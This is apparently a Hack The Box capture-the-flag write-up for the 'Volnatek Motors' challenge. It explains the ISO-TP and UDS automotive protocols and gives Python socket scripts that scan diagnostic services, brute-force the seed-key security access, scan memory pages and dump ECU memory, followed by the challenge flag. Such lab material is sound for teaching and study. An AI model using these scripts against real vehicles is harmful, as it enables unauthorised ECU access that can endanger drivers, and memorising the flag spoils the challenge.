![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>
Volnatek Motors
</font>

12<sup>th</sup> Apr 2025

Prepared By: `0xSn4k3000`

Challenge Author(s): `0xSn4k3000`

Difficulty: <font color='green'>hard</font>

<br><br>

# Synopsis (!)

- Remote exploitation of automotive diagnostic protocols
- Implementation of ISO-TP (ISO 15765-2) transport layer protocol
- Utilizing UDS (Unified Diagnostic Services) to interact with a vehicle's ECU
- Session manipulation to access restricted diagnostic services
- Security bypass through seed-key authentication mechanism brute-forcing
- Memory address reconnaissance and targeted data extraction

## Description (!)
- Our Intel-team inside Volnaya managed to gain physical access to a high-ranking official’s smart car and installed a covert device on the vehicle. Through this backdoor, we now have remote access to the ECU. Use UDS over ISO-TP to tap into the system and extract critical memory data. If necessary, brute-force diagnostic session keys to gain elevated access. This intel will help us compromise more of Volnaya’s vehicles.

## Skills Required (!)

- Knowledge of automotive protocols (ISO-TP and UDS)
- Understanding of ECU diagnostic services and sessions
- Socket programming and binary data manipulation
- Brute-force attack methodologies
- Ability to parse and interpret binary responses
- Basic cryptographic concepts (seed-key authentication)
- Memory dumping and analysis techniques

# Solution (!)

## Step 1: Connect to the server

Start by connecting to the server with `nc` and send some junk data and nothing is back.

```bash
nc 0 8888
aaaaaaa

```

Now, if you search the `ISO-TP` on Google, you can find out that `ISO-TP` is an automotive protocol used as a “transport layer”.
The Wiki page describe the protocol frames and flow. Most important: there are 4 frames type, the first nibble is the frame type.

## Step 2: Understand the protocol

The Unified Diagnostic Services (UDS) is a diagnostic communication protocol used in electronic control units (ECUs) within automotive electronics.
ISO 15765-2,[1] or ISO-TP (Transport Layer), is an international standard for sending data packets over a CAN-Bus. The protocol allows for the transport of messages that exceed the eight byte maximum payload of CAN frames. ISO-TP segments longer messages into multiple frames, adding metadata (CAN-TP Header) that allows the interpretation of individual frames and reassembly into a complete message packet by the recipient.

**The ISO-TP defines four frame types:**

| Type                    | Code | Description                                                                                                                                                                                                        |
| ----------------------- | ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Single Frame (SF)       | 0    | The single frame transferred contains the complete payload of up to 7 bytes (normal addressing) or 6 bytes (extended addressing).                                                                                  |
| First Frame (FF)        | 1    | The first frame of a longer multi-frame message packet, used when more than 6/7 bytes of data segmented must be communicated. The first frame contains the length of the full packet, along with the initial data. |
| Consecutive Frame (CF)  | 2    | A frame containing subsequent data for a multi-frame packet.                                                                                                                                                       |
| Flow Control Frame (FC) | 3    | The response from the receiver, acknowledging a First-frame segment. It lays down the parameters for the transmission of further consecutive frames.                                                               |

**CAN-TP Header**

| Frame Type  | Bit Offset (7..4, byte 0) | Bit Offset (3..0, byte 0) | Byte 1 (15..8) | Byte 2 (23..16)      | ...    |
| ----------- | ------------------------- | ------------------------- | -------------- | -------------------- | ------ |
| Single      | 0                         | Size (0..7)               | Data A         | Data B               | Data C |
| First       | 1                         | Size (8..4095)            | Data A         | Data B               |        |
| Consecutive | 2                         | Index (0..15)             | Data A         | Data B               | Data C |
| Flow        | 3                         | FC Flag (0,1,2)           | Block Size     | ST (Separation Time) |        |

### UDS Serivces

UDS provide a varient of services for diagnostic tool (client),
Each UDS service is identified by a Service Identifier (SID)—a single byte (e.g., 0x10, 0x22, etc.).

#### Common UDS Services

| SID    | Service Name                 | Description                                                                                                    |
| ------ | ---------------------------- | -------------------------------------------------------------------------------------------------------------- |
| `0x10` | Diagnostic Session Control   | Starts a diagnostic session (e.g., default, extended, programming). Required for accessing advanced functions. |
| `0x11` | ECU Reset                    | Requests a soft or hard reset of the ECU.                                                                      |
| `0x14` | Clear Diagnostic Information | Clears stored Diagnostic Trouble Codes (DTCs).                                                                 |
| `0x19` | Read DTC Information         | Retrieves DTCs and status information.                                                                         |
| `0x22` | Read Data By Identifier      | Reads the value of a specific Data Identifier (DID) from the ECU.                                              |
| `0x23` | Read Memory By Address       | Reads raw memory from a specified address and length.                                                          |
| `0x27` | Security Access              | Unlocks security-protected services through a seed-key authentication challenge.                               |
| `0x28` | Communication Control        | Enables or disables specific communication channels on the ECU.                                                |
| `0x2E` | Write Data By Identifier     | Writes values to specified DIDs.                                                                               |
| `0x31` | Routine Control              | Executes routines like self-tests, ECU programming, and checks.                                                |
| `0x34` | Request Download             | Initiates a data download (e.g., firmware update).                                                             |
| `0x35` | Request Upload               | Initiates data upload from the ECU.                                                                            |
| `0x36` | Transfer Data                | Transfers data blocks as part of a download/upload sequence.                                                   |
| `0x37` | Request Transfer Exit        | Ends the download/upload session.                                                                              |
| `0x3E` | Tester Present               | Keeps the diagnostic session alive, preventing timeouts.                                                       |

The `Tester Present` is the ping request for an ECU which is a 1 byte request: 0x3E. This request must be put into a Single Frame, because the ISO-TP is the transport protocol: 0x01 0x3e (Single Frame, size 1, data 0x3E)

```bash
$ echo -ne '\x01\x3e' | nc IP PORT
~

```

Using a basic `nc` connection along with `echo`, we successfully received a response from the UDS server. Now, let’s move forward and implement the same functionality using Python by crafting a script to send a `Tester Present` diagnostic request.

Below is a simple Python script that connects to the UDS server and sends the `Tester Present` service request (`0x3E`), which acts as a heartbeat to keep the diagnostic session active:

```python
#!/usr/bin/python3

import socket
import logging

HOST, PORT = "127.0.0.1", 8888

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(levelname)s - %(message)s')
logger = logging.getLogger('UDS-Client')

def TesterPresent(sock):
    logger.info("Sending a hearbeat: TesterPresent service")

    payload = bytearray([0x1, 0x3E])
    logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
    sock.send(payload)

    response = bytearray(sock.recv(8))
    status = "positive" if response[1] == 0x7E else "negative"
    logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))} ({status})")


TesterPresent(sock)

sock.close()
```

Output:

```bash
INFO - Sending a hearbeat: TesterPresent service
INFO - Sending payload: 01 3e
INFO - Response: 01 7e (positive)
```

This confirms that the server correctly acknowledged the Tester Present request with a positive response (0x7E), ensuring the session remains active.

#### 0x23: Read Memory By Address Service

One of the services that can help us is service 0x23,
Read memory by address services allow the diagnostic tool to read the information from a certain region of the memory in ECU. The client requests information from the ECU by providing the starting memory address and the size of the memory to be read.

Frame format:

```
+--------+----------------------+-----------------+------------------+
|  SID   | Format Identifier    | Memory Address  | Memory Size      |
|(1Byte) | (1Byte)              | (2Bytes)        | (2Bytes)         |
+--------+----------------------+-----------------+------------------+
```

Let’s craft a simple UDS frame to read 1 byte from memory address 0x1000 using the `ReadMemoryByAddress` service (SID 0x23).

- SID: will be `0x23`
- Format Identifier: ALFI = 0xXY (0x22)
  - X (high nibble): number of bytes in memory address
  - Y (low nibble): number of bytes in memory size
- Memory Size: 0x00 0x01
- Memory Address: 0x10 0x00

```python
payload = bytearray([0x6, 0x23, 0x22, 0x10, 0x00, 0x00, 0x01])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))}")
```

We sent the request, and response from the server is:

```bash
INFO - Sending payload: 06 23 22 10 00 00 01
INFO - Response: 03 7f 23 7f
```

**Response Breakdown:**

- 03 — Number of bytes in the response

- 7F — Indicates a Negative Response

- 23 — The original Service ID that caused the negative response (ReadMemoryByAddress)

- 7F — The Negative Response Code (NRC)

If we refer to the NRC (Negative Response Code) table in the UDS specification, we can see that 0x7F corresponds to:

    "Service Not Supported in Active Session"

This means the requested service is valid but is not available in the current diagnostic session. To proceed, the session must be changed to one that supports this service (e.g., Programming Session).

## Step 3: Change our client session

UDS offers access levels called "sessions". Different sessions usually offer different levels of access to services and/or sub-functions. During normal use (on start), the session should be 0x01 Default Session.

We can switch between diagnostic sessions using service 0x10, known as `Diagnostic Session Control`.

Frame format:

```
+--------+----------------------+
|  SID   | Session ID           |
| (0x10) | (1Byte)              |
+--------+----------------------+
```

By default, four standard sessions are defined:

- 0x01 Default Session which typically has the lowest level of access to services and/or sub-functions. This will usually allow 0x14 Clear Diagnostic Information, certain 0x22 Read Data By Identifier "Data Identifiers", and more.

- 0x02 Programming Session gives access to "0x34 Download / 0x35 Upload" and "0x36 Data Transmission" services. Normal functionality does mostly not work, at least not during download.

- 0x03 Extended Diagnostic Session which typically offers further "Diagnostic and Communications Management", "Data Transmission", "Input / Output Control", and "Remote Activation of Routine" services.

- 0x04 Safety System Diagnostic Session offers largely the same as 0x03 Extended Diagnostic Session, but does not always offer sensitive or unrelated services and/or sub-functions. It may offer further routines and data transmission sub-functions.

OEMs or vendors can define custom session types using proprietary sub-function IDs. They also have the flexibility to omit or modify default session behavior depending on their system design and security policies.

Let’s attempt to switch to the `Extended Diagnostic Session`:

```
INFO - Sending payload: 02 10 03
INFO - Response: 03 7f 10 12
```

We sent a frame with a payload size of `0x02`, invoking service `0x10` (`Diagnostic Session Control`) with sub-function `0x03`, which corresponds to the `Extended Diagnostic Session`.

However, the ECU responded with a negative response:

- 0x7F indicates a negative response format

- 0x10 is the echoed service ID (Diagnostic Session Control)

- 0x12 is the Negative Response Code (NRC) meaning `Sub-function not supported`

This suggests that the ECU does not support the `Extended Diagnostic Session`, at least in its current state.

Let’s now try switching to a different session: the `Programming Session`.

This time we get a successful response:

```bash
INFO - Sending payload: 02 10 02
INFO - Response: 02 50 02
```

The response `0x50` is calculated as `0x10` (the original service ID) + 0x40, which indicates a positive response to the `Diagnostic Session Control` request. The second byte, 0x02, is the echoed sub-function, confirming that the ECU has successfully switched to the `Programming Session`.

We are now operating in the `Programming Session` mode.

## Step 4: Identify session capabilities

In UDS, sessions are used to manage and control access to specific diagnostic services.
Let’s now explore which functions are available in our current session — the `Programming Session`.

Service IDs (SIDs) in UDS typically range from 0x10 to 0x3E by default. However, OEMs can extend or modify this range to implement additional proprietary services. To discover which SIDs are available on a specific ECU, we can scan through a wider range—for example, from 0x10 up to 0x90.

If we send a request with an unknown or unsupported SID, such as `0x80`, the ECU will usually not respond at all, indicating that the service is unrecognized:

```bash
INFO - Sending payload: 01 80


```

Now, let’s try a known but potentially unsupported service — `0x29`, which corresponds to `Authentication`:

```bash
INFO - Sending payload: 01 29
INFO - Response: 03 7f 29 11
```

Here, we receive a negative response:

- 0x7F indicates a negative response format
- 0x29 echoes the original service ID
- 0x11 is the Negative Response Code (NRC) meaning "Service Not Supported"

This method allows us to brute-force discover available services. The key is to look for responses that:

- Are not negative responses (0x7F) with NRC (0x11)
- Or don't time out, especially if the ECU responds within 5 seconds

By filtering for meaningful responses, we can efficiently map out which services are accessible in the current session.

### Brute-Force services

```python
sock.settimeout(5.0)
sids = []
for i in range(0x10 , 0x90):
    payload = bytearray([0x1, i])
    logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
    sock.send(payload)
    try:
        response = bytearray(sock.recv(8))
        if response:
            logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))}")
            if response[3] != 0x11:
                sids.append(i)
    except:
        logger.info("Response: Timeout")

logger.info(f"Available Services: {sids}")
sock.settimeout(15.0)
```

After running the script, we receive a list of available UDS services detected on the ECU

```bash
...
INFO - Available Services: [16, 34, 35, 39]
```

These correspond to the following service IDs:

```text
0x10 – Diagnostic Session Control
0x22 – Read Data By Identifier
0x23 – Read Memory By Address
0x27 – Security Access
```

## Step 5: Attempt to Read Memory

Now that we’ve confirmed that service 0x23 (Read Memory By Address) is available in the `Programming Session`, we can attempt to use it after switching to that session (0x02).

```python
payload = bytearray([0x2, 0x10, 0x2])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))} (Changing to Programming Session)")


payload = bytearray([0x6, 0x23, 0x22, 0x10, 0x00, 0x00, 0x01])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))}")
```

This result on

```bash
INFO - Sending payload: 02 10 02
INFO - Response: 02 50 02 (Changing to Programming Session)
INFO - Sending payload: 06 23 22 10 00 00 01
INFO - Response: 03 7f 23 33
```

This time, we received a different response compared to our previous memory read attempt. Although it's still a negative response, the NRC (0x33) indicates a new issue.

Looking up the code 0x33, we find the meaning is:

- 0x33 – Security Access Denied

This suggests that the ECU requires a valid security unlock sequence before granting access to memory read operations within this session.

## Step 6: Get security access

One of the services available for our session is `0x27` (`Security Access`) when we look the service up we will find.

```
Security check is available to enable the most security-critical services. For this purpose a "Seed" is generated and sent to the client by the control unit. From this "Seed" the client has to compute a "Key" and send it back to the control unit to unlock the security-critical services.
```

Security access is granted based on these two,

1. Seed (0x01)
2. Key (0x02)

- The tester sends the request to unlock the ECU using SID 0x27 and sub-function ID 0x01. 0x01 means requesting for seed.
- The UDS server receives the request assumes conditions are correct and generates the random seed and key based on a cryptographic algorithm and the Server sends the Seed to the client with a positive response.
- With the received seed, the tester tool generates the key and sends this key to the server to unlock the ECU using SID 0x27 and sub-function ID 0x02. 0x02 means key.
- If the unlock key sent by the tester tool(client) matches with the server expecting key it will send the positive response and Unlock the ECU otherwise it will send a negative response with the specific negative response code.

So let's try to get a seed:

```python
# Get into Programming Session
payload = bytearray([0x2, 0x10, 0x2])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))} (Changing to Programming Session)")

# Get a Seed
payload = bytearray([0x2, 0x27, 0x1])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))}")
seed = response[3:]
logger.info(f"Seed: {seed}")
```

We successfully obtained a seed from the ECU:

```bash
INFO - Sending payload: 02 10 02
INFO - Response: 02 50 02 (Changing to Programming Session)
INFO - Sending payload: 02 27 01
INFO - Response: 06 67 01 30 30 30 30
INFO - Seed: bytearray(b'0000')
```

This indicates that the ECU has responded positively to the Security Access – Request Seed (0x27 01), providing the seed value 0x30 0x30 0x30 0x30 ("0000" in ASCII).
However, without knowing the correct key (password) to unlock the session, this seed alone isn’t sufficient to proceed. We would need to calculate or bypass the challenge-response mechanism to gain access.

### Brute-Force password

If we resend the request for a seed, we observe that the seed remains constant: 0000 (\x30\x30\x30\x30). This indicates that the key can be brute-forced.

However, brute-forcing the range from 0x00000000 to 0xFFFFFFFF means you're going through 2³² = 4,294,967,296 possible values — basically a full 32-bit key space.

Since we’re performing this over the internet, latency and response times can significantly affect performance. In this case, we'll proceed with the attack and rely a bit on luck (Easy Key).

We first test sending a random key to see how the ECU will respond.

```python
payload = bytearray([0x6, 0x27, 0x2, 0x1, 0x1, 0x1, 0x1])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))}")
```

Output:

```bash
INFO - Sending payload: 06 27 02 01 01 01 01
INFO - Response: 03 7f 27 35
```

As expected, we receive a negative response with the NRC `0x35`. Looking up this code reveals it corresponds to `0x35 – Invalid Key`. Now that we understand how to brute-force the key and recognize a correct response based on the NRC, we can proceed with the attack more effectively.

```python
from itertools import product

# Get into Programming Session
payload = bytearray([0x2, 0x10, 0x2])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))} (Changing to Programming Session)")

# Get a Seed (Doesn't has a meaning but we don't know if the ECU login mechanism depend on this)
payload = bytearray([0x2, 0x27, 0x1])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))}")
seed = response[3:]
logger.info(f"Seed: {seed}")

# Brute Force the Key
for b1, b2, b3, b4 in product(range(256), repeat=4):
    payload = bytearray([0x6, 0x27, 0x2, b1, b2, b3, b4])
    logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
    sock.send(payload)

    response = bytearray(sock.recv(8))
    logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))}")
    if response[1] != 0x7f:
        logger.info(f"Key Found: {b1, b2, b3, b4}")
        break
```

We have successfully obtained a key.

```bash
INFO - Key Found: (0, 0, 1, 0)
```

## Step 7: Read Memory

After we have obtained the correct key now we will try to read the memory again and see.

```python
# Get into Programming Session
payload = bytearray([0x2, 0x10, 0x2])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))} (Changing to Programming Session)")

# Get a Seed
payload = bytearray([0x2, 0x27, 0x1])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))}")
seed = response[3:]
logger.info(f"Seed: {seed}")

# Login
payload = bytearray([0x6, 0x27, 0x2, 0x0, 0x0, 0x1, 0x0])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))}")
if response[1] != 0x7f:
    logger.info(f"Logged in")

# Read Memory
payload = bytearray([0x6, 0x23, 0x22, 0x10, 0x00, 0x00, 0x01])
logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
sock.send(payload)

response = bytearray(sock.recv(8))
logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))}")
```

Output:

```bash
INFO - Sending payload: 02 10 02
INFO - Response: 02 50 02 (Changing to Programming Session)
INFO - Sending payload: 02 27 01
INFO - Response: 06 67 01 30 30 30 30
INFO - Seed: bytearray(b'0000')
INFO - Sending payload: 06 27 02 00 00 01 00
INFO - Response: 02 67 02
INFO - Logged in
INFO - Sending payload: 06 23 22 10 00 00 01
INFO - Response: 03 7f 23 31
```

What’s new here is the final response to the read memory request: `03 7f 23 31`. This is a negative response with NRC `0x31 (Request Out of Range)`. This likely indicates that our current session either does not have permission to access this memory region or that the memory does not exist.

### Brute-Forcing Memory Addresses

Next, we’ll attempt to read a single byte from each memory page in the range 0x0000 to 0xF000, with each page spanning 0x1000 bytes. This will help us identify which memory pages are accessible in our current session.

```python
...
for i in range(0x0, 0xf0, 0x10):
    payload = bytearray([0x6, 0x23, 0x22, i, 0x00, 0x00, 0x01])
    logger.info(f"Sending payload: {' '.join(map(lambda x: f'{x:02x}', payload))}")
    sock.send(payload)

    response = bytearray(sock.recv(8))
    logger.info(f"Response: {' '.join(map(lambda x: f'{x:02x}', response))}")
    if response[1] != 0x7f:
        logger.info(f"{hex(i)}00 is Valid")
```

Output:

```bash
INFO - Sending payload: 06 23 22 40 00 00 01
INFO - Response: 02 63 00
INFO - 0x4000 is Valid
```

We successfully read data from 0x4000 address, so now let's try to dump the entire page.

## Step 8: Dump entire memory page

When you request more than 7 bytes of data (like reading a chunk of memory), the ISO-TP protocol kicks in:

### Step-by-Step Flow

1. Client sends a request
   _(e.g., UDS `ReadMemoryByAddress`)_ – usually fits in a Single Frame.

2. Server responds with a First Frame (FF)

   - Indicates total payload length.
   - Sends the first chunk of data (up to 6 bytes in this frame).

3. Client sends a Flow Control (FC) frame

   - Tells the server: "You can keep sending" (or not).
   - Contains:
     - Flow Status (FS):
       - `0x00` = Continue To Send (CTS)
       - `0x01` = Wait (WT)
       - `0x02` = Overflow/Abort (OVFLW)
     - Block Size (BS):  
       How many Consecutive Frames (CFs) the client can handle before sending another FC.
     - Separation Time (STmin):  
       Minimum time between CFs (used for flow throttling).

4. Server sends Consecutive Frames (CF)
   - Starts with a sequence number (1 to 15, then wraps).
   - Data continues until the full message is transmitted.

Now, we’ll begin requesting memory in chunks. After each First Frame response, we’ll send a Flow Control frame to allow the transmission of Consecutive Frames. We’ll continue reading and appending the incoming data until the entire memory page has been retrieved. Once the page is fully read, we’ll save the contents to a file named `dump.bin`.

```python
def ReadMemoryByAddress(sock, address, size):
    logger.info(f"Reading memory at address: 0x{address:X}, size: {size} bytes")

    # Format the addressing information
    # We'll use 2 bytes for address (addressSizeFormat=0x2) and 2 bytes for size (sizeFormat=0x2)
    addr_format = 0x22  # First digit: address size (2 bytes), Second digit: size bytes (2 bytes)

    # Build payload: [Total Length, SID (0x23), Format, Address MSB, Address LSB, Size MSB, Size LSB]
    payload = bytearray([
        0x6,                         # Length (total bytes including this byte)
        0x23,                         # Service ID (ReadMemoryByAddress)
        addr_format,                  # Address/Size format
        (address >> 8) & 0xFF,        # Address MSB
        address & 0xFF,               # Address LSB
        (size >> 8) & 0xFF,           # Size MSB
        size & 0xFF                   # Size LSB
    ])

    logger.info(f"Sending payload: {' '.join(f'{x:02X}' for x in payload)}")
    sock.send(payload)

    # Read the first 8 bytes of the response
    response = sock.recv(8)
    if not response or len(response) < 1:
        logger.error("No response received")
        return None

    logger.info(f"Initial response: {' '.join(f'{x:02X}' for x in response)}")

    # Check if this is a single frame or first frame
    frame_type = response[0] & 0xF0

    logger.info(f"Frame type: {frame_type}")

    if frame_type == 0x00:  # Single frame
        # Extract the payload length from the first byte
        length = response[0] & 0x0F
        logger.info(f"Single frame with length: {length}")

        # Extract the payload (remove the length byte)
        data = response[1:1+length]

    elif frame_type == 0x10:  # First frame - start of multi-frame message
        # Calculate total message length from first frame
        length_msb = response[0] & 0x0F
        length_lsb = response[1]
        total_length = (length_msb << 8) | length_lsb
        logger.info(f"First frame of multi-frame message with length: {total_length}")

        # Extract data from first frame (bytes 2-7 in the response)
        data = bytearray(response[2:])
        remaining_length = total_length - len(data)

        # Send flow control frame to continue receiving
        flow_control = bytearray([0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])  # CTS, no block limit, no delay
        logger.info(f"Sending flow control: {' '.join(f'{x:02X}' for x in flow_control)}")
        sock.send(bytearray([len(flow_control)]) + flow_control)

        # Keep receiving consecutive frames until we have all the data
        sequence = 1
        while remaining_length > 0:
            # Read the next frame
            frame = sock.recv(8)  # Each frame can be up to 8 bytes
            if not frame:
                logger.error("Failed to receive consecutive frame")
                return None

            logger.info(f"Received frame: {' '.join(f'{x:02X}' for x in frame)}")

            # Verify this is a consecutive frame
            if (frame[0] & 0xF0) != 0x20:
                logger.error(f"Expected consecutive frame but got: 0x{frame[0]:02X}")
                return None

            # Extract sequence number from the frame
            received_seq = frame[0] & 0x0F
            logger.info(f"Received consecutive frame with sequence number: {received_seq}")

            # Extract data from the consecutive frame (skip the header byte)
            frame_data = frame[1:]
            data.extend(frame_data)

            # Update the remaining length
            bytes_received = len(frame_data)
            remaining_length -= bytes_received
            logger.info(f"Received {bytes_received} bytes, {remaining_length} bytes remaining")

            # Send another flow control if needed (for block size)
            # This would go here if implementing block size control

            sequence = (sequence + 1) & 0x0F  # Wrap around after 15
    else:
        logger.error(f"Unexpected response format: 0x{frame_type:02X}")
        return None

    # Check if this is a positive response
    if len(data) > 0 and data[0] == 0x63:  # Positive response for ReadMemoryByAddress
        # Extract the memory data (skip the service ID)
        memory_data = data[1:]
        logger.info(f"Successfully read {len(memory_data)} bytes from memory")
        return memory_data
    elif len(data) >= 3 and data[0] == 0x7F and data[1] == 0x23:
        # Negative response
        error_code = data[2]
        logger.error(f"Negative response with error code: 0x{error_code:02X}")
        if error_code == 0x13:
            logger.error("Security access denied")
        elif error_code == 0x22:
            logger.error("Conditions not correct or request sequence error")
        elif error_code == 0x31:
            logger.error("Request out of range")
        else:
            logger.error(f"Unknown error code: 0x{error_code:02X}")
        return None
    else:
        logger.error(f"Unexpected response format: {' '.join(f'{x:02X}' for x in data)}")
        return None


memory_dump = bytearray()
for i in range(0x100, 0x1000, 0x100):
    memory_data = ReadMemoryByAddress(sock, 0x4000 + i, 0x100)  # Read 128 bytes from 0x4000
    memory_dump += memory_data

with open("dump.bin", "wb") as f:
    f.write(memory_dump)

```

We successfully read 0x4000 to 0x4fff and saved that to dump.bin

```
�E#VIN coding� "%ECU Serial Number�ECU Software Version�ECU Manufacturing Date�#EgEngine Temperature�4Battery Voltage's�9�����8���W1��Lpm�����!GP��Ň
                                                                                                                                                    �	��o3w�JZ�ª/ߚ�Ӕ��ڼ�P^��穣��n.ʘ�y₡
�E�bx�8�s(�Q��xl%9F���Y�L��Mp���SFRCe2gxZGQzbl8xbl9mMTRzaF9zM2dtM250fQ==!9x����e���:��ӶM)�)5�ӵ��s�m]���;$��l=�3	�ͥ��v��͘ȗ�l���b����W���JV���������������kH�W�-߀u��ҡh�&�A��Ă;��6��I4+^��\;���׺Z�_;퇚\�y"1j��h��	���R��A��
```

There is a base64 encoded text in the dump, `SFRCe2gxZGQzbl8xbl9mMTRzaF9zM2dtM250fQ==` once decoded flag will appear.
